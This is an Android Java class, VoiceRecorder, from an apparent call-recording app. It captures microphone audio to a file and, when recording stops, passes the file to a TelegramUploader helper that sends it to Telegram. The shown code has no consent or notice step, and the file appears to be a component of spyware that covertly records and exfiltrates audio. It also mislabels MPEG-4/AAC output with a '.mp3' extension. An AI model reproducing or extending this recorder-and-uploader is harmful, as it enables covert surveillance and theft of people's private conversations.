package com.example.callvoicerecorder;

import android.content.Context;
import android.media.MediaRecorder;
import java.io.File;

public class VoiceRecorder {
    private MediaRecorder recorder;
    private File voiceFile;
    private boolean isRecording = false;

    public void startRecording(Context context) {
        if (isRecording) return;
        isRecording = true;

        try {
            File dir = new File(context.getExternalFilesDir(null), "VoiceRecords");
            if (!dir.exists()) dir.mkdirs();

            voiceFile = new File(dir, "voice_" + System.currentTimeMillis() + ".mp3");
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setOutputFile(voiceFile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void stopRecordingAndSend(Context context) {
        if (!isRecording) return;
        isRecording = false;

        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                TelegramUploader.sendToTelegram(context, voiceFile, false);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
